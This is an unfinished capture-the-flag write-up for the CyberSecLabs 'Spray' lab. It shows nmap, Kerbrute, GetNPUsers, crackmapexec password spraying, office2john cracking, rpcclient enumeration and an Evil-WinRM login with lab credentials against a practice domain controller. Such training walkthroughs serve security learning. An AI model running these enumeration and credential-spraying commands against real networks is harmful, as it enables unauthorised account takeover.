---
description: https://www.cyberseclabs.co.uk/labs/info/Spray/
---

# Spray (WIP)

![](<../../../.gitbook/assets/image (605).png>)

## Nmap

```
sudo nmap 172.31.3.9 -sS -p- -sC

Not shown: 65513 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: SPRAY
|   NetBIOS_Domain_Name: SPRAY
|   NetBIOS_Computer_Name: SPRAY-DC
|   DNS_Domain_Name: spray.csl
|   DNS_Computer_Name: Spray-DC.spray.csl
|   DNS_Tree_Name: spray.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-19T20:51:44+00:00
| ssl-cert: Subject: commonName=Spray-DC.spray.csl
| Not valid before: 2020-09-09T15:27:45
|_Not valid after:  2021-03-11T15:27:45
|_ssl-date: 2020-12-19T20:51:44+00:00; -3s from scanner time.                                                                                                                                                                              
5985/tcp  open  wsman                                                                                                                                                                                                                      
9389/tcp  open  adws                                                                                                                                                                                                                       
49667/tcp open  unknown                                                                                                                                                                                                                    
49669/tcp open  unknown                                                                                                                                                                                                                    
49670/tcp open  unknown                                                                                                                                                                                                                    
49675/tcp open  unknown                                                                                                                                                                                                                    
49676/tcp open  unknown                                                                                                                                                                                                                    
49679/tcp open  unknown                                                                                                                                                                                                                    
49696/tcp open  unknown                                                                                                                                                                                                                    
49703/tcp open  unknown                                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
Host script results:                                                                                                                                                                                                                       
|_clock-skew: mean: -3s, deviation: 0s, median: -3s                                                                                                                                                                                        
|_nbstat: NetBIOS name: SPRAY-DC, NetBIOS user: <unknown>, NetBIOS MAC: 02:5c:13:73:3d:18 (unknown)                                                                                                                                        
| smb2-security-mode:                                                                                                                                                                                                                      
|   2.02:                                                                                                                                                                                                                                  
|_    Message signing enabled and required                                                                                                                                                                                                 
| smb2-time:                                                                                                                                                                                                                               
|   date: 2020-12-19T20:51:44
|_  start_date: N/A
```

## SMB

A standard quick check with null authentication using smbclient and crackmapexec produces no viable vectors to follow.

![](<../../../.gitbook/assets/image (606).png>)

## Kerberos

As Kerberos is open on port 88 we can try to enumerate some usernames with Kerbrute. We have a domain name from Nmap when port 3389 was enumerated.

```
kerbrute userenum /usr/share/seclists/Usernames/Names/names.txt -d spray.csl --dc 172.31.3.9
```

This only returns one result which was for the user 'calvin'.

![](<../../../.gitbook/assets/image (607).png>)

I decided at this point to try a bigger wordlist as I normally would not expect to pull one name from an Active Directory server.

```
kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -d spray.csl --dc 172.31.3.9
```

![](<../../../.gitbook/assets/image (608).png>)

Better results this time. Lets put them in a text file and Kerberoast them using Impacket's GetNPUsers.py script.

```
python2 GetNPUsers.py spray.csl/ -request -usersfile /home/kali/spray/users.txt  -dc-ip 172.31.3.9
```

![](<../../../.gitbook/assets/image (609).png>)

None of the users are Kerberoastable. Looking at our nmap results we can try password spraying against the list of users against SMB and WinRM.

We can use crackmapexec to kick off multiple instances of bruteforcing against our known users account. I will start with SMB to see if we get a hit.

```
crackmapexec smb 172.31.3.9 -u freedy -p /usr/share/wordlists/rockyou.txt
crackmapexec smb 172.31.3.9 -u calvin -p /usr/share/wordlists/rockyou.txt
crackmapexec smb 172.31.3.9 -u johana -p /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (610).png>)

After a short while we get a hit from johana:johana

![](<../../../.gitbook/assets/image (611).png>)

We can check what access we get with smbclient.

```
smbclient -U johana -L \\\\172.31.3.9
```

![](<../../../.gitbook/assets/image (612).png>)

```
smbclient -U johana \\\\172.31.3.9\\spray
```

![](<../../../.gitbook/assets/image (613).png>)

I was unable to open the document due to encryption. We can confirm this with the `file` command.

```
kali@kali:~$ file Important\ Note.docx 

Important Note.docx: CDFV2 Encrypted
```

Kali comes installed with a Python script called office2john.py. We can use this to convert the document to a hash in which we can attempt to crack the encryption password.

![](<../../../.gitbook/assets/image (615).png>)

With the hash stored in a file we can run this against John and attempt to crack it with the rockyou.txt wordlist.

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/spray/hash
```

After cracking we get the password '181818'. I was then able to open the document with LibreOffice on Kali.

![](<../../../.gitbook/assets/image (616).png>)

We can try spraying this password with our user list against SMB and WinRM with crackmapexec. Before we try crackmapexec lets check if Kylesir gets a hit on Kerbrute.

```
kerbrute userenum <usersfile> -d spray.csl --dc 172.31.3.9
```

![](<../../../.gitbook/assets/image (617).png>)

We can check our new users against Impackets GetNPusers.py.

```
python2 GetNPUsers.py spray.csl/ -request -usersfile <userfile>  -dc-ip 172.31.3.9
```

![](<../../../.gitbook/assets/image (618) (1).png>)

Nothing here unfortunately. Lets try crackmapexec.

```
crackmapexec smb 172.31.3.9 -u <usersfile>  -p Spray.csl1337 --continue-on-success
crackmapexec winrm 172.31.3.9 -u <usersfile>  -p Spray.csl1337 --continue-on-success
```

![](<../../../.gitbook/assets/image (619).png>)

Looks like we are not getting any hits with our new password and our new user. Looking at our initial Nmap results we still have RPC to try.

I ended up trying our known working credentials of johana:johana and was able to access RPC.

```
rpcclient -U johana 172.31.3.9
```

From here I was able to the `enumdomusers` command and we are able to see an extra users we have not come across yet.

![](<../../../.gitbook/assets/image (620).png>)

Lets try the new user hackzzdogs against SMB and WinRM.

```
crackmapexec smb 172.31.3.9 -u hackzzdogs -p Spray.csl1337
crackmapexec winrm 172.31.3.9 -u hackzzdogs -p Spray.csl1337
```

![](<../../../.gitbook/assets/image (621).png>)

Great, we have a valid hit. Lets use these credentials with Evil-WinRM.

```
evil-winrm -u hackzzdogs -p Spray.csl1337 -i 172.31.3.9
```

![](<../../../.gitbook/assets/image (623).png>)
